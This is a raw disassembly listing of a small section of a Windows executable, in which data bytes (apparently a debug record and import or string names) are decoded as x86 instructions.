  420f71:	xor    dl,BYTE PTR [eax]
  420f73:	add    BYTE PTR [eax-0x13ffefd8],ch
  420f79:	push   cs
  420f7a:	inc    edx
  420f7b:	add    al,dh
  420f7d:	push   cs
  420f7e:	inc    edx
  420f7f:	add    ah,dh
  420f81:	push   cs
  420f82:	inc    edx
  420f83:	add    al,bh
  420f85:	push   cs
  420f86:	inc    edx
  420f87:	add    ah,bh
  420f89:	push   cs
  420f8a:	inc    edx
  420f8b:	add    BYTE PTR [eax],al
  420f8d:	cmovb  eax,DWORD PTR [eax]
  420f90:	add    al,0xf
  420f92:	inc    edx
  420f93:	add    BYTE PTR [eax],cl
  420f95:	cmovb  eax,DWORD PTR [eax]
  420f98:	adc    DWORD PTR [ebp+0x10],ebx
  420f9b:	add    bh,cl
  420f9d:	push   es
  420f9e:	adc    BYTE PTR [eax],al
  420fa0:	xchg   esp,eax
  420fa1:	xor    eax,0x7b780010
  420fa6:	adc    BYTE PTR [eax],al
  420fa8:	stos   BYTE PTR es:[edi],al
  420fa9:	jo     0x420fbb
  420fab:	add    BYTE PTR [eax],ch
  420fad:	inc    esp
  420fae:	adc    BYTE PTR [eax],al
  420fb0:	pop    ebp
  420fb1:	pop    ecx
  420fb2:	adc    BYTE PTR [eax],al
  420fb4:	fild   QWORD PTR [edi]
  420fb6:	adc    BYTE PTR [eax],al
	...
  420fc0:	push   edx
  420fc1:	push   ebx
  420fc2:	inc    esp
  420fc3:	push   ebx
  420fc4:	ja     0x421039
  420fc6:	or     al,0x9c
  420fc8:	in     al,dx
  420fc9:	cmp    BYTE PTR [esi-0x5fb463c0],ah
  420fcf:	dec    ecx
  420fd0:	adc    BYTE PTR [eax],al
  420fd2:	and    BYTE PTR [ecx+0x1],ch
  420fd5:	add    BYTE PTR [eax],al
  420fd7:	add    BYTE PTR [ebx+0x3a],al
  420fda:	pop    esp
  420fdb:	inc    ebx
  420fdc:	jne    0x421050
  420fde:	jb     0x421045
  420fe0:	outs   dx,BYTE PTR ds:[esi]
  420fe1:	je     0x421027
  420fe3:	popa   
  420fe4:	je     0x421047
  420fe6:	pop    esp
  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
